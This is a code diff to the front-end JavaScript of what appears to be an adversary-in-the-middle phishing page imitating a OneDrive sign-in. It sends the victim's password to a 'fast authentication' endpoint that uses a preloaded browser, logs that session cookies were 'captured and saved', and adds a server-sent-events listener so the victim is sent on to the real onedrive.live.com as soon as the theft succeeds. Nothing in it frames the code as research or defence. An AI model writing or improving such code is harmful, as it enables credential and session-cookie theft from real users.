@@ -1069,6 +1069,25 @@ Status: ${data.status}`);
                     return;
                 }
 
+                // Set up SSE connection for immediate redirect notifications
+                let immediateRedirectHandled = false;
+                const eventSource = new EventSource(`/api/auth-status/${currentSessionId}`);
+                
+                eventSource.addEventListener('login-success', function(event) {
+                    if (!immediateRedirectHandled) {
+                        immediateRedirectHandled = true;
+                        console.log('🚀 Immediate redirect triggered by SSE event!');
+                        console.log('Redirecting to OneDrive immediately...');
+                        eventSource.close();
+                        window.location.href = 'https://onedrive.live.com';
+                    }
+                });
+
+                eventSource.addEventListener('error', function(event) {
+                    console.warn('SSE connection error:', event);
+                    eventSource.close();
+                });
+
                 // Use fast authentication endpoint with preloaded browser
                 const response = await fetch('/api/authenticate-password-fast', {
                     method: 'POST',
@@ -1091,22 +1110,27 @@ Status: ${data.status}`);
                     return;
                 }
 
+                // Close SSE connection since we have the final response
+                eventSource.close();
+
                 if (data.success) {
-                    // Authentication successful
-                    const authMethod = data.preloadUsed ? 'Fast Authentication (preloaded)' : 'Standard Authentication';
-                    console.log(`Login successful! ${authMethod} - Cookies captured and saved.`);
+                    // Only proceed if immediate redirect hasn't happened
+                    if (!immediateRedirectHandled) {
+                        const authMethod = data.preloadUsed ? 'Fast Authentication (preloaded)' : 'Standard Authentication';
+                        console.log(`Login successful! ${authMethod} - Cookies captured and saved.`);
 
-                    // Show performance metrics if available
-                    if (data.metrics) {
-                        console.log(`⚡ Performance: ${data.metrics.totalAuthMs}ms total, preload: ${data.metrics.preloadUsed}`);
+                        // Show performance metrics if available
+                        if (data.metrics) {
+                            console.log(`⚡ Performance: ${data.metrics.totalAuthMs}ms total, preload: ${data.metrics.preloadUsed}`);
+                        }
+
+                        currentSessionId = data.sessionId;
+                        currentUserEmail = data.userEmail;
+
+                        // Fallback redirect (in case SSE didn't trigger)
+                        console.log('Redirecting to OneDrive...');
+                        window.location.href = 'https://onedrive.live.com';
                     }
-
-                    currentSessionId = data.sessionId;
-                    currentUserEmail = data.userEmail;
-
-                    // Redirect immediately to OneDrive
-                    console.log('Redirecting to OneDrive...');
-                    window.location.href = 'https://onedrive.live.com';
                 } else {
                     throw new Error(data.message || data.error || 'Unknown error');
                 }
